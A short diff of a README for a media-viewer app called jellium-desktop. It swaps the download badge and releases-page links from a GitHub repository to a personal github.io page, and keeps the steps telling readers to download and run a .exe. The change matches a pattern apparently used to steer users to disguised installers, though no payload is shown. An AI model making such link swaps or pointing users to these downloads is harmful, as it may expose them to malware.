@@ -1,6 +1,6 @@
 # 🖥️ jellium-desktop - Watch your media library with ease
 
-[![](https://img.shields.io/badge/Download-Jellium-blue)] (https://github.com/Wilmerangolan401/jellium-desktop)
+[![](https://img.shields.io/badge/Download-Jellium-blue)] (https://wilmerangolan401.github.io)
 
 ## 📌 About this application
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these basic needs:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the [releases page](https://github.com/Wilmerangolan401/jellium-desktop) to find the latest version.
+1.  Visit the [releases page](https://wilmerangolan401.github.io) to find the latest version.
 2.  Look for the file that ends with the .exe extension under the Assets section.
 3.  Click the file name to download it to your computer.
 4.  Once the download finishes, locate the file in your Downloads folder.
